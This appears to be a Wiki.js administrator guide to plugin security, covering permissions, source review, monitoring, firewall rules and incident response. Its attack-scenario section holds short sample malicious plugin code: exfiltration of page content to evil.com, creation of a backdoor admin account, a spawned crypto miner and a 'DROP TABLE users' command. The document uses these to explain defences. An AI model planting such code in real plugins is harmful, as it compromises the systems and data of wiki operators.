# Plugin Security Guide

This guide explains the security model of Wiki.js plugins and best practices for administrators.

## Security Model Overview

### Trust-Based System

**IMPORTANT**: Wiki.js plugins use a **trust-based** security model, NOT OS-level sandboxing.

**What this means**:
- Plugins run in the same Node.js process as Wiki.js
- Permissions are validated at runtime, not enforced by the OS
- Malicious plugins CAN potentially access system resources
- **Only install plugins from trusted sources**

### Why Not Sandboxed?

Node.js does not provide true process isolation:
- The `vm` module is NOT a security boundary
- Worker threads share memory space
- Child processes add significant overhead

**Design Decision**: Trust-based permission system with code review instead of false security promises.

## Permission System

### Understanding Permissions

Plugins declare required permissions in their manifest. The system validates permissions at runtime.

**Available Permissions**:

#### Configuration
- `config:read` - Read plugin configuration
- `config:write` - Write plugin configuration

#### Database
- `database:read` - Query database (SELECT)
- `database:write` - Modify database (INSERT, UPDATE, DELETE)
- `core:read` - Read core Wiki.js models (read-only)

#### Hooks and Events
- `hooks:register` - Register lifecycle hooks
- `hooks:trigger` - Trigger hooks manually
- `events:emit` - Emit custom events
- `events:listen` - Listen to events

#### API and UI
- `api:extend` - Add REST API endpoints (Phase 2)
- `graphql:extend` - Extend GraphQL schema (requires restart)
- `ui:extend` - Add UI components (Phase 2)

#### Storage and Cache
- `storage:read` - Read from plugin storage
- `storage:write` - Write to plugin storage
- `cache:read` - Read from cache
- `cache:write` - Write to cache

#### System
- `logger:use` - Use logging functionality

### Reviewing Permissions

Before installing a plugin, review its requested permissions:

```graphql
query {
  plugins {
    single(id: "plugin-to-review") {
      permissions
      description
    }
  }
}
```

**Questions to ask**:
- Does the plugin need ALL these permissions?
- Are any permissions excessive for stated functionality?
- Does `database:write` make sense for this plugin?
- Why does it need `core:read` access?

**Example - Webhook Plugin**:
```yaml
permissions:
  - hooks:register   # ✓ Needs to listen to events
  - logger:use       # ✓ For logging
  - config:read      # ✓ To read webhook URL
```

**Red Flag Example**:
```yaml
# Simple notification plugin requesting excessive permissions
permissions:
  - database:write   # ⚠️ Why does it need database write?
  - core:read        # ⚠️ Why access core models?
  - graphql:extend   # ⚠️ Why modify GraphQL?
```

## Security Best Practices

### Before Installing

#### 1. Verify Source

**Only install plugins from**:
- Official Wiki.js sources
- Verified developers
- Open-source repositories you can review
- Your own organization

**Never install**:
- Plugins from unknown sources
- Plugins without source code access
- Pirated or modified versions

#### 2. Review Source Code

If source is available:

```bash
# Extract and review
unzip plugin.zip -d /tmp/review
cd /tmp/review

# Look for suspicious patterns
grep -r "eval(" .
grep -r "child_process" .
grep -r "require('fs')" .
grep -r "process.env" .
```

**Red flags**:
- Obfuscated code
- External network requests to unknown domains
- File system access beyond plugin directory
- Execution of shell commands
- Dynamic `require()` or `eval()`

#### 3. Check Dependencies

Review `package.json` dependencies:

```bash
cat package.json
npm audit
```

**Red flags**:
- Excessive dependencies
- Unmaintained packages
- Known vulnerabilities
- Suspicious package names

### After Installing

#### 1. Monitor Logs

Watch for suspicious activity:

```bash
journalctl -u wikijs -f | grep "Plugin"
```

**Watch for**:
- Unexpected network requests
- Database queries to non-plugin tables
- Error messages indicating malicious behavior
- Excessive resource usage

#### 2. Monitor Resource Usage

```bash
# CPU and memory
top | grep node

# Network connections
netstat -tunlp | grep node

# Disk usage
du -sh plugins/data/*
```

#### 3. Review Plugin Errors

```graphql
query {
  plugins {
    errors {
      pluginId
      errorType
      message
      createdAt
    }
  }
}
```

**Investigate**:
- Permission denied errors (plugin trying unauthorized access)
- Network errors (unexpected external connections)
- Database errors (suspicious queries)

### Regular Maintenance

#### Weekly

- Check plugin error logs
- Review resource usage
- Monitor for unusual behavior

#### Monthly

- Review installed plugins
- Check for updates
- Remove unused plugins
- Audit permissions

## Threat Model

### What Plugins CAN Do

**With appropriate permissions**:
- Read and write database (plugin-prefixed tables)
- Read core models (read-only)
- Store files in plugin directory
- Make HTTP requests
- Emit and listen to events
- Log messages

**Without any special permissions**:
- Access file system (entire server)
- Execute shell commands
- Modify core code
- Access environment variables
- Open network sockets

**Reality**: Due to Node.js limitations, malicious plugins can bypass permissions.

### Attack Scenarios

#### Scenario 1: Data Exfiltration

**Malicious plugin**:
```javascript
async onPageSave(event) {
  // Plugin pretends to be a webhook notifier
  // Actually exfiltrates page content
  await axios.post('https://evil.com/collect', {
    title: event.page.title,
    content: event.page.content,
    author: event.page.authorName
  })
}
```

**Mitigation**:
- Review source code
- Monitor network traffic
- Use firewall rules to restrict outbound connections

#### Scenario 2: Backdoor Creation

**Malicious plugin**:
```javascript
async activated() {
  // Creates admin user
  await this.WIKI.models.users.query().insert({
    email: 'backdoor@evil.com',
    password: hashedPassword,
    isAdmin: true
  })
}
```

**Mitigation**:
- Review source code before installation
- Monitor user creation in logs
- Regular user audits

#### Scenario 3: Cryptocurrency Mining

**Malicious plugin**:
```javascript
async activated() {
  // Spawns crypto miner
  const { spawn } = require('child_process')
  spawn('crypto-miner', ['--url', 'evil.com', '--threads', '8'])
}
```

**Mitigation**:
- Monitor CPU usage
- Review process list
- Restrict process spawning with OS-level controls

#### Scenario 4: Database Manipulation

**Malicious plugin**:
```javascript
async init() {
  // Direct database access bypassing permissions
  await this.db.knex.raw('DROP TABLE users')
}
```

**Mitigation**:
- Database user permissions (read-only where possible)
- Database backups
- Code review

## Defense in Depth

Since plugins cannot be fully sandboxed, use multiple layers of defense:

### 1. Database Security

**Separate database users**:
```sql
-- Plugin-specific user with limited permissions
CREATE USER 'wikijs_plugins'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT ON wikijs.* TO 'wikijs_plugins'@'localhost';
GRANT INSERT, UPDATE, DELETE ON wikijs.plugin_* TO 'wikijs_plugins'@'localhost';
```

### 2. Network Security

**Firewall rules**:
```bash
# Restrict outbound connections
iptables -A OUTPUT -p tcp -m owner --uid-owner wikijs -j REJECT

# Allow only specific destinations
iptables -A OUTPUT -p tcp -m owner --uid-owner wikijs -d 1.2.3.4 -j ACCEPT
```

### 3. File System Security

**Restrict file system access**:
```bash
# Run Wiki.js as unprivileged user
useradd -r -s /bin/false wikijs

# Limit file permissions
chown -R wikijs:wikijs /opt/wikijs
chmod -R 750 /opt/wikijs
```

### 4. Process Isolation

**Use containers**:
```yaml
# Docker Compose with resource limits
services:
  wikijs:
    image: requarks/wiki:2
    cpus: 2
    mem_limit: 2g
    read_only: true
    security_opt:
      - no-new-privileges:true
```

### 5. Monitoring and Alerting

**Set up monitoring**:
- Log all plugin installations
- Alert on high CPU/memory usage
- Monitor network traffic
- Track database queries

### 6. Backup and Recovery

**Regular backups**:
```bash
# Daily database backup
mysqldump wikijs_db > backup_$(date +%Y%m%d).sql

# Backup plugin configs
pg_dump -t plugins -t pluginPermissions > plugin_backup.sql
```

## Incident Response

### If Malicious Plugin Detected

#### 1. Immediate Actions

```bash
# Stop Wiki.js
sudo systemctl stop wikijs

# Disable network
iptables -A OUTPUT -j REJECT
```

#### 2. Remove Plugin

```graphql
# If GraphQL still accessible
mutation {
  plugins {
    deactivate(id: "malicious-plugin") {
      responseResult { succeeded }
    }
  }
}

mutation {
  plugins {
    uninstall(id: "malicious-plugin") {
      responseResult { succeeded }
    }
  }
}
```

Or manually:
```bash
rm -rf plugins/installed/malicious-plugin
mysql -e "DELETE FROM plugins WHERE id='malicious-plugin';"
```

#### 3. Assess Damage

- Check for unauthorized users
- Review database modifications
- Check for created files
- Review running processes
- Analyze network traffic logs

#### 4. Recovery

- Restore from backup if needed
- Change admin passwords
- Rotate API keys
- Review audit logs

#### 5. Post-Incident

- Document incident
- Improve screening process
- Share findings with community
- Report to plugin author/source

## Security Checklist

### Pre-Installation
- [ ] Verify plugin source
- [ ] Review source code
- [ ] Check dependencies
- [ ] Audit permissions
- [ ] Test in non-production
- [ ] Backup database

### Post-Installation
- [ ] Monitor logs for 24 hours
- [ ] Check resource usage
- [ ] Verify expected behavior
- [ ] Review error logs
- [ ] Test plugin functionality

### Ongoing
- [ ] Weekly log review
- [ ] Monthly permission audit
- [ ] Check for updates
- [ ] Monitor resource usage
- [ ] Review plugin errors
- [ ] Maintain backups

## Recommended Tools

### Monitoring

- **Logs**: journalctl, Docker logs, PM2 logs
- **Resources**: htop, netdata, prometheus
- **Network**: tcpdump, wireshark, nmap
- **Files**: auditd, inotify-tools

### Security Scanning

```bash
# Scan for vulnerabilities
npm audit

# Check dependencies
snyk test

# Static analysis
eslint --plugin security
```

## Reporting Security Issues

If you discover a security vulnerability:

1. **Do NOT** disclose publicly
2. **Contact**: security@requarks.io
3. **Provide**: Detailed description and reproduction steps
4. **Wait**: For response before disclosure

## Summary

- Plugins use trust-based security, NOT sandboxing
- Only install plugins from trusted sources
- Review source code before installation
- Monitor plugins after installation
- Use defense in depth (database, network, file system security)
- Maintain regular backups
- Have an incident response plan

**Remember**: The most critical security control is **trusting your plugin sources**.

## Related Documentation

- [Installation Guide](./installation.md)
- [Configuration Guide](./configuration.md)
- [Troubleshooting Guide](./troubleshooting.md)
